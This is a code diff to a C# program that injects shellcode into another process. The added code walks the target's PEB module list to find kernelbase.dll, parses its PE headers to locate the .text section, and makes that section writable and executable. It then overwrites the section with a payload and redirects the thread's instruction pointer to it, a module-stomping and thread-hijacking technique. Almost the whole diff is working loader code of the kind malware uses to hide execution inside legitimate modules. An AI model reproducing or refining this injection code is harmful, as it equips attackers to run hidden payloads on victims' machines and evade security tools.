@@ -1,11 +1,13 @@
+using System;
 using System.Diagnostics;
-using System.Net.Http;
-using System.Runtime.InteropServices;
-using System.Text.Json;
-using System.Threading.Tasks;
-using System.Security.Cryptography;
 using System.IO;
 using System.Linq;
+using System.Net.Http;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Text.Json;
+using System.Threading.Tasks;
 
 namespace sharp
 {
@@ -96,14 +98,14 @@ namespace sharp
             out IntPtr lpNumberOfBytesWritten
         );
 
-        [DllImport("kernel32.dll")]
+        [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool ReadProcessMemory(
-            int hProcess,
-            int lpBaseAddress,
-            byte[] lpBuffer, 
-            int dwSize, 
-            ref int lpNumberOfBytesRead
-            );
+              IntPtr hProcess,
+              IntPtr lpBaseAddress,
+              [Out] byte[] lpBuffer,
+              int dwSize,
+              out IntPtr lpNumberOfBytesRead
+                );
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr CreateRemoteThread(
@@ -319,47 +321,106 @@ namespace sharp
 
                 // 3. Allocation in the "adopted" process
                 IntPtr targetAddress = IntPtr.Zero;
-                IntPtr fallbackAddress = targetAddress;
                 int payloadSize = payload.Length;
-                string[] banDll = { "ntdll.dll", "kernel32.dll", "advapi32.dll" };
-                
+                IntPtr finalAddress=IntPtr.Zero;
                 PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
-                foreach (ProcessModule module in Process.GetProcessById((int)pi.dwProcessId).Modules)
-                {
-                    if (module.ModuleMemorySize < payloadSize)
-                        continue;
+                    int status = NtQueryInformationProcess(pi.hProcess, 0, ref pbi, Marshal.SizeOf(pbi), out _);
 
-                    if (module.ModuleName.Equals("kernelbase.dll", StringComparison.OrdinalIgnoreCase))
+                    if (status != 0)
+                        Console.WriteLine("[-] Failed to query process information");
+
+                    byte[] buffer = new byte[8];
+
+                    if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress + 0x18, buffer, buffer.Length, out _))
+                        Console.WriteLine("[-] Failed to read Ldr from PEB");
+
+                    IntPtr ldrAddress = (IntPtr)BitConverter.ToUInt64(buffer, 0);
+
+                    if (!ReadProcessMemory(pi.hProcess, ldrAddress + 0x10, buffer, buffer.Length, out _))
+                         Console.WriteLine("[-] Failed to read InMemoryOrderModuleList");
+
+                    IntPtr anchor = ldrAddress + 0x10;
+                    IntPtr currentEntry = (IntPtr)BitConverter.ToUInt64(buffer, 0);
+
+                    while (currentEntry != anchor)
                     {
-                        if (module.ModuleMemorySize > payloadSize)
+                        if (!ReadProcessMemory(pi.hProcess, currentEntry + 0x58, buffer, 16, out _))
                         {
-                            targetAddress = module.BaseAddress;
                             break;
                         }
+                        ushort length = BitConverter.ToUInt16(buffer, 0);
+                        IntPtr pDllName = (IntPtr)BitConverter.ToUInt64(buffer, 8);
+
+                        if (length > 0 && length < 256)
+                        {
+                            byte[] dllNameBytes = new byte[length];
+                            if (ReadProcessMemory(pi.hProcess, pDllName, dllNameBytes, length, out _))
+                            {
+                                string foundDll = Encoding.Unicode.GetString(dllNameBytes).TrimEnd('\0');
+
+                                if (foundDll.EndsWith("kernelbase.dll", StringComparison.OrdinalIgnoreCase))
+                                {
+
+                                    if (ReadProcessMemory(pi.hProcess, currentEntry + 0x30, buffer, 8, out _))
+                                    {
+                                        IntPtr baseAddress = (IntPtr)BitConverter.ToUInt64(buffer, 0);
+                                        targetAddress = baseAddress; // Store the base address of kernelbase.dll
+                                        Console.WriteLine($"[+] Found {"kernelbase.dll"} at 0x{baseAddress.ToInt64():X}");
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+
+                        if (!ReadProcessMemory(pi.hProcess, currentEntry, buffer, 8, out _))
+                        {
+                            break;
+                        }
+
+                        currentEntry = (IntPtr)BitConverter.ToUInt64(buffer, 0);
                     }
-                    if (module.ModuleName != "kernelbase.dll")
-                    {
-                        if (banDll.Any(name => name.Equals(module.ModuleName, StringComparison.OrdinalIgnoreCase)))
-                            continue;
-
-                        if (fallbackAddress == IntPtr.Zero)
-                            fallbackAddress = module.BaseAddress;
-                    }
-
-                }
-
-                IntPtr finalAddress = targetAddress != IntPtr.Zero ? targetAddress : fallbackAddress;
-
-                if (finalAddress != IntPtr.Zero)
+                    if(targetAddress == IntPtr.Zero)
+                        Console.WriteLine("[-] Failed to find kernelbase.dll in the target process.");
+                   
+                bool peOffset = ReadProcessMemory(pi.hProcess, targetAddress + 0x3C, buffer, buffer.Length, out _);
+                if (peOffset)
                 {
-                    finalAddress += 0x2000; 
+                    int e_lfanew = BitConverter.ToInt32(buffer, 0);
+                    IntPtr ntHeaderAddress = targetAddress + e_lfanew ;
+                    bool NumberOfSections = ReadProcessMemory(pi.hProcess, ntHeaderAddress + 0x06, buffer, buffer.Length, out _);
+                    ushort _NumberOfSections = BitConverter.ToUInt16(buffer, 0);
+                    bool SizeOfOptionalHeader = ReadProcessMemory(pi.hProcess, ntHeaderAddress + 0x14, buffer, buffer.Length, out _);
+                    ushort _SizeOfOptionalHeader = BitConverter.ToUInt16(buffer, 0);
+                    IntPtr currentSectionAddress = ntHeaderAddress + 24 + _SizeOfOptionalHeader;
+
+                    for (int i = 0; i < _NumberOfSections; i++)
+                    {
+                        ReadProcessMemory(pi.hProcess, currentSectionAddress, buffer, 8, out _);
+                        string sectionName = Encoding.ASCII.GetString(buffer).TrimEnd('\0'); 
+
+                        if (sectionName.StartsWith(".text", StringComparison.OrdinalIgnoreCase))
+                        {
+                            ReadProcessMemory(pi.hProcess, currentSectionAddress + 0x08, buffer, 4, out _);
+                            uint sectionVirtualSize = BitConverter.ToUInt32(buffer, 0);
+
+                            ReadProcessMemory(pi.hProcess, currentSectionAddress + 0x0C, buffer, 4, out _);
+                            uint sectionVirtualAddress = BitConverter.ToUInt32(buffer, 0);
+
+                            if (sectionVirtualSize >= payloadSize)
+                            {
+                                finalAddress = targetAddress + (int)sectionVirtualAddress;
+                                bool fixProtect = VirtualProtectEx(pi.hProcess, finalAddress, (UIntPtr)payloadSize, 0x40, out uint oldProtect);
+                                WriteProcessMemory(pi.hProcess, finalAddress, payload, payload.Length, out _);
+                                VirtualProtectEx(pi.hProcess, finalAddress, (UIntPtr)payloadSize, oldProtect, out _);
+                                Console.WriteLine($"[+] Found {sectionName} at 0x{finalAddress.ToInt64():X}");
+                                break;
+                            }
+                        }
+                        currentSectionAddress += 40; 
+                    }
+
                 }
-                uint oldProtect;
-                VirtualProtectEx(pi.hProcess, finalAddress, (UIntPtr)payload.Length, 0x04, out oldProtect);
-                IntPtr bytesWritten;
-                WriteProcessMemory(pi.hProcess, finalAddress, payload, payload.Length, out bytesWritten);
-                VirtualProtectEx(pi.hProcess, finalAddress, (UIntPtr)payload.Length, 0x20, out oldProtect);
-        
+                if (finalAddress == IntPtr.Zero) { Console.WriteLine("[-] Section not found"); return; }
                 // 5. Starting the thread
                 CONTEXT64 cONTEXT64 = new CONTEXT64();
 
@@ -376,7 +437,7 @@ namespace sharp
                 Console.WriteLine($"[+] New RIP (Shellcode): 0x{(ulong)finalAddress.ToInt64():X}");
 
                 ulong oldRip = cONTEXT64.Rip;
-                cONTEXT64.Rsp -= 8;
+                cONTEXT64.Rsp = (cONTEXT64.Rsp - 8) & ~0xFul;
                 byte[] ripBytes = BitConverter.GetBytes(oldRip);
                 WriteProcessMemory(pi.hProcess, (IntPtr)cONTEXT64.Rsp, ripBytes, ripBytes.Length, out _);
 
